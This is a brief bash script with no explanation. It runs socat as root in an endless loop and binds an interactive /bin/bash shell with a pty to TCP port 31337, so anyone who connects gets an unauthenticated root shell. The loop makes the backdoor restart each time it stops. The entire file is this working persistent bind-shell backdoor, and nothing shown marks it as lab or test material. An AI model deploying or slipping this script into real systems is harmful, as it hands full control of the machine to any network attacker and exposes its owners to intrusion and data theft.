#!/bin/bash

while [ true ]; do
	su -l root -c "socat -dd TCP4-LISTEN:31337,fork,reuseaddr EXEC:'/bin/bash',pty,echo=0,raw,iexten=0 2> /dev/null"
done;
